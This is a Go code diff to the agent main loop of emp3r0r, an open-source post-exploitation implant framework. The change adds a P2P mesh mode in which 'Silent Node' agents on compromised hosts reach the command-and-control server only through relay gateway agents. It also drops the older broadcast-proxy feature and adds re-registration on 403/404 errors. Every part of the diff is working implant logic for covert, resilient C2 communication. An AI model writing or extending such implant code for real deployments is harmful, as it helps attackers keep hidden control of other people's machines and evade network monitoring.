@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"net"
+	"net/http"
 	"os"
 	"os/user"
 	"runtime"
@@ -15,7 +16,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/handler"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/mesh"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -132,61 +133,73 @@ func agent_main() {
 		common.RuntimeConfig.C2TransportProxy = cdnproxyAddr
 	}
 
-	// do we have internet?
-	checkInternet := func(cnt *int) bool {
-		if isC2Reachable() {
-			// if we do, we are feeling helpful
-			logging.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
-			ctx, cancel := context.WithCancel(context.Background())
-			go modules.StartBroadcast(true, ctx, cancel) // auto-proxy feature
-			return true
+	// ────────────────────────────────────────────────────────────────────────────
+	// Mode selection: P2P mesh vs standalone
+	// ────────────────────────────────────────────────────────────────────────────
+	if common.RuntimeConfig.IsP2PEnabled {
+		meshCtx, meshCancel := context.WithCancel(context.Background())
+		defer meshCancel()
+		mesh.Start(meshCtx)
 
-		} else if !netutil.IsTor(def.CCAddress) &&
-			!transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
-			// we don't, just wait for some other agents to help us
-			logging.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
-			if *cnt == 0 {
-				go func() {
-					ctx, cancel := context.WithCancel(context.Background())
-					logging.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
-					err := modules.BroadcastServer(ctx, cancel, "")
-					if err != nil {
-						logging.Fatalf("BroadcastServer: %v", err)
+		if !common.RuntimeConfig.IsDirectC2Enabled {
+			// Silent Node: never contact C2 directly.
+			// WaitForRoute returns the Gateway IP once a probe KCP dial succeeds.
+			logging.Println("[*] Mesh Silent Node: waiting for a Gateway route...")
+			mesh.WaitForRoute() // blocks until first gateway confirmed
+			// Build the C2 HTTP client with TLS config, then override its DialContext
+			// to dial a fresh DialGateway per request using the current best gateway.
+			// mesh.GetGatewayIP() is re-evaluated per dial, so gateway failover is automatic.
+			def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
+			if def.HTTPClient != nil {
+				if tr, ok := def.HTTPClient.Transport.(*http.Transport); ok {
+					tr.DialContext = func(ctx context.Context, _, _ string) (net.Conn, error) {
+						gwIP := mesh.GetGatewayIP()
+						if gwIP == "" {
+							return nil, fmt.Errorf("mesh: no gateway available")
+						}
+						return mesh.DialGateway(ctx, gwIP)
 					}
-				}()
+				}
 			}
-			*cnt++
-			return false
+			logging.Printf("[+] Mesh route ready via gateway %s", mesh.GetGatewayIP())
+		} else {
+			// Gateway: also serves the relay, but contacts C2 normally.
+			logging.Println("[*] Mesh Gateway mode: relay started, connecting to C2 directly")
 		}
-		return true
 	}
-	i := 0
-	for !checkInternet(&i) {
-		logging.Printf("[%d] Checking Internet connectivity...", i)
-		if common.RuntimeConfig.C2TransportProxy != "" {
-			logging.Printf("[+] Thank you! We got a proxy: %s", common.RuntimeConfig.C2TransportProxy)
-			break
+
+	// ────────────────────────────────────────────────────────────────────────────
+	// Standalone + Gateway: wait for direct C2 reachability
+	// ────────────────────────────────────────────────────────────────────────────
+	if !common.RuntimeConfig.IsP2PEnabled || common.RuntimeConfig.IsDirectC2Enabled {
+		for !isC2Reachable() {
+			logging.Println("[-] C2 unreachable, retrying...")
+			util.TakeASnap(false)
 		}
-		util.TakeASnap(false)
 	}
 
 	isCheckedIn := false
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	// Preflight Check
-	if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
-		logging.Println("Preflight check failed, signaling parent and sleeping")
-		conditionalC2FailNotify()
-		// if we return from the above, it means we are resumed
-		goto connect
+	// Preflight Check — skipped for Silent Nodes (no direct C2 path).
+	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
+	if !isSilentNode {
+		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
+			logging.Println("Preflight check failed, signaling parent and sleeping")
+			conditionalC2FailNotify()
+			goto connect
+		}
 	}
 
-	// apply whatever proxy setting we have just added
-	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
-	if def.HTTPClient == nil {
-		logging.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
-		util.TakeASnap(false)
-		goto connect
+	// Build C2 HTTP client. Silent Nodes already created theirs above with relay dialer.
+	if !isSilentNode {
+		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
+		if def.HTTPClient == nil {
+			logging.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
+			util.TakeASnap(false)
+			goto connect
+		}
 	}
 	if common.RuntimeConfig.C2TransportProxy != "" {
 		logging.Printf("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
@@ -227,6 +240,10 @@ connect:
 	def.CCMsgConn = conn
 	if err != nil {
 		logging.Printf("Connection failed: %v, signaling parent and sleeping", err)
+		if strings.Contains(err.Error(), "403") || strings.Contains(err.Error(), "404") {
+			logging.Warningf("Agent is not recognized by C2 (403/404), requiring re-registration")
+			isCheckedIn = false
+		}
 		conditionalC2FailNotify()
 		goto connect
 	}
